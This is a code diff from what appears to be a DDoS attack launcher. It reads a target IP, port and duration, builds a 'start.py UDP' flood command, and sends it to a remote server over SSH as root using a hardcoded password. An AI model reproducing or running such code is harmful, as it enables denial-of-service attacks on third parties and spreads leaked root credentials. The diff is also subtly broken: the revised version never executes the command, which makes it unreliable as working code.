@@ -67,9 +67,15 @@ if layer4input == "UDP":
     portudp = input(f"port ══ ")
     
     timeudp = input(f"time ══ ")
-    cmdudp = 'cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + '900' + ' ' + timeudp
-    ssh.connect(ssh.surf, username=root, password=RHE8Y5cqjK, port=8227)
-    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmdudp)
+    cmdudp = 'screen && cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + '900' + ' ' + timeudp
+    host1 = "surf.ssh"
+    username1 = "root"
+    password1 = "RHE8Y5cqjK"
+    port1 = 8227
+    client = paramiko.client.SSHClient()
+    client.connect(host1, username=username1, password=password1, port=port1)
+    
+    client.close()
 
 if layer4input == "TCP":
     iptcp = input(f"ip ══ ")
